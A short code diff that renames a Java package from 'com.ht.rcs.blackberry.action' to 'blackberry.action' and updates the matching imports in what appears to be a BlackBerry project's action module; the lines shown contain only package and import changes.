@@ -8,14 +8,14 @@
  * Created      : 26-mar-2010
  * *************************************************/
 
-package com.ht.rcs.blackberry.action;
+package blackberry.action;
 
 import java.util.Vector;
 
-import com.ht.rcs.blackberry.Status;
-import com.ht.rcs.blackberry.event.Event;
-import com.ht.rcs.blackberry.utils.Debug;
-import com.ht.rcs.blackberry.utils.DebugLevel;
+import blackberry.Status;
+import blackberry.event.Event;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
 
 // TODO: Auto-generated Javadoc
 /**
